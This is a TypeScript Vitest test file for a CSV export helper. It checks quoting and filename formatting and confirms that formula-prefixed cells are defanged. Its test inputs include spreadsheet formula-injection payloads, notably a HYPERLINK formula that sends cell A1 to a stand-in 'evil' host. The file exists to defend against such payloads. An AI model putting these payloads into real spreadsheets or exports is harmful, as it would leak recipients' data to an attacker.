import { describe, expect, it } from 'vitest';

import { csvFilename, toCsv } from './build';

const stripBom = (s: string): string => (s.charCodeAt(0) === 0xfeff ? s.slice(1) : s);

const oneRow = (value: string): string => {
  const csv = toCsv([{ v: value }], [{ header: 'v', value: (r) => r.v }]);
  // Skip the header line; return just the data cell.
  return stripBom(csv).split('\r\n')[1];
};

describe('escapeCell (via toCsv)', () => {
  it('passes plain text through unquoted', () => {
    expect(oneRow('hello')).toBe('hello');
  });

  it('quotes cells containing commas, quotes, or newlines', () => {
    expect(oneRow('a, b')).toBe('"a, b"');
    expect(oneRow('a "b" c')).toBe('"a ""b"" c"');
    expect(oneRow('a\nb')).toBe('"a\nb"');
  });

  it('defangs formula-prefixed strings with leading apostrophe', () => {
    expect(oneRow('=1+1')).toBe('"\'=1+1"');
    expect(oneRow('+SUM(A1:A2)')).toBe('"\'+SUM(A1:A2)"');
    expect(oneRow('-CMD')).toBe('"\'-CMD"');
    expect(oneRow('@evil')).toBe('"\'@evil"');
    expect(oneRow('\tinjected')).toBe('"\'\tinjected"');
  });

  it('defangs payloads hidden behind leading whitespace', () => {
    // Excel and friends trim leading whitespace before evaluating the
    // formula. ` =HYPERLINK(...)` must not bypass the check.
    expect(oneRow('  =HYPERLINK("evil","Free")')).toMatch(/^"'  =/);
  });

  it('defangs the HYPERLINK-exfiltration classic', () => {
    const payload = '=HYPERLINK("https://evil/" & A1, "Free $100")';
    const row = oneRow(payload);
    expect(row.startsWith('"\'=HYPERLINK')).toBe(true);
    // No raw `=` at the start — that's the whole point of the defang.
    expect(row.startsWith('=')).toBe(false);
  });
});

describe('csvFilename', () => {
  it('formats date as YYYY-MM-DD and appends .csv', () => {
    expect(csvFilename('customers', new Date('2026-05-23T10:00:00Z'))).toMatch(
      /^customers-2026-05-\d{2}\.csv$/,
    );
  });
});
